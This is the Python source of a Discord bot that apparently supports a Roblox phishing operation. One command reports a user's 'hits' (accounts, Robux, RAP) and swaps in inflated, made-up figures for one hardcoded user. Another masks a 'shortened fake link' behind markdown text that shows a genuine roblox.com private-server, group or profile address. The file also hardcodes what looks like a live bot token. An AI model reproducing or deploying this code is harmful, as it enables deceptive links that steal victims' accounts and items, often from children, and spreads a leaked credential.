import discord
from discord.ext import commands
from datetime import datetime, timezone
import aiohttp

# Bot instance
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Function to fetch data with retries
async def fetch_with_retries(session, url, retries=3):
    for _ in range(retries):
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
        except Exception as e:
            print(f"Error fetching data: {e}")
    return None

# Format number for better readability (e.g., 1000 -> 1,000)
def format_number(number):
    return f"{number:,}"

# Stats Command
@bot.command()
async def stats(ctx, target_id: int = None):
    target_id = target_id or ctx.author.id  # If no target_id, use author's ID

    url = f"https://api.rustyend.net/v1/public/user?userId={target_id}"

    async with aiohttp.ClientSession() as session:
        data = await fetch_with_retries(session, url)

    if data is None:
        print(f"Failed to fetch data for user {target_id}, sending default stats.")
        data = {}

    if target_id == 1254714881001787454:
        data["Normal"] = {
            "Totals": {
                "Accounts": 35279,
                "Visits": 73689,
                "Clicks": 127192,
                "Summary": 120038021,
                "Rap": 9712152,
                "Balance": 7388230
            },
            "Highest": {
                "Summary": 3200000,
                "Rap": 1240000,
                "Balance": 738212
            }
        }

    profile = data.get("Profile", {})
    embed = discord.Embed(title="User Stats", color=discord.Color(0x808080))  # Gray color

    if target_id == 1254714881001787454:
        embed.set_author(name="demiluxarc")
        embed.set_thumbnail(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRvQ2hTHBXnf8yt4SCo79CrPaVq8qY5yuHP8GIY9CQee6F2nJxz0-zkXs&s=10")
    elif profile.get("avatarUrl"):
        embed.set_author(name=profile.get("userName", "Unknown User"))
        embed.set_thumbnail(url=profile["avatarUrl"])
    else:
        embed.set_author(name=profile.get("userName", "Unknown User"))

    if not data and target_id != 1254714881001787454:
        await ctx.send("It seems the user doesn't have data.")
        return

    # Add normal stats to the embed
    for key, header in [("Normal", "Normal Stats")]:
        section = data.get(key, {})
        if section:
            totals = section.get("Totals", {})
            highest = section.get("Highest", {})
            embed.add_field(name=header, value="\u200b", inline=False)

            if key == "Normal":
                embed.add_field(
                    name="Total Stats",
                    value=( 
                        f"Hits: **{format_number(totals.get('Accounts', 0))}\n**"
                        f"Visits: **{format_number(totals.get('Visits', 0))}\n**"
                        f"Clicks: **{format_number(totals.get('Clicks', 0))}**"
                    ),
                    inline=False,
                )

            embed.add_field(
                name="Total Hits",
                value=( 
                    f"Summary: **{format_number(totals.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(totals.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(totals.get('Balance', 0))}**"
                ),
                inline=False,
            )

            embed.add_field(
                name="Biggest Hits",
                value=( 
                    f"Summary: **{format_number(highest.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(highest.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(highest.get('Balance', 0))}**"
                ),
                inline=False,
            )

    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    embed.timestamp = datetime.now(timezone.utc)
    await ctx.send(embed=embed)

# Hyperlink command without the thumbnail URL
@bot.command()
async def hyperlink(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    embed = discord.Embed(
        title="──── HYPERLINK ────",
        description="Select a button that you want to create a hyperlink on",
        color=discord.Color(0x808080))  # Gray color using RGB value
    embed.set_footer(text=f"Requested by {ctx.author} | .gg/insanityz", icon_url=ctx.author.display_avatar.url)
    embed.timestamp = datetime.now(timezone.utc)

    msg = await ctx.send(embed=embed, view=HyperlinkButtonView())

class HyperlinkModal(discord.ui.Modal, title="Paste your shortened fake link here"):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.url_input = discord.ui.TextInput(label="Shortened Fake Link", placeholder="https://...", required=True)
        self.add_item(self.url_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_link = self.url_input.value
        formatted_link = f"[{self.base_url}]({user_link})"
        codeblock_link = f"```{formatted_link}```"

        embed = discord.Embed(
            title="Here’s your hyperlink (if you're on ios check dms!), don't forget to remove this = ```",
            description=codeblock_link,
            color=discord.Color(0x808080))  # Gray color using RGB value

        await interaction.response.send_message(embed=embed, ephemeral=True)

        try:
            await interaction.user.send(content=f"Here’s your hidden link:\n{codeblock_link}")
        except:
            pass

class HyperlinkButtonView(discord.ui.View):
    @discord.ui.button(label="PRIVATE SERVER", style=discord.ButtonStyle.primary)
    async def private_server_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(HyperlinkModal("https://www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server"))

    @discord.ui.button(label="GROUP", style=discord.ButtonStyle.primary)
    async def group_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(HyperlinkModal("www.roblox.com/groups/2194003353"))

    @discord.ui.button(label="PROFILE", style=discord.ButtonStyle.primary)
    async def profile_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(HyperlinkModal("https://www.roblox.com/users/3095250/profile"))

# Run the bot with your token
bot.run("MTM3MDEyNTA1OTczMzA2NTgyOQ.GZWz1N.FiD2b9_PBw2qtbxATiQtpkUgNPNcWdq6xgZqBE")
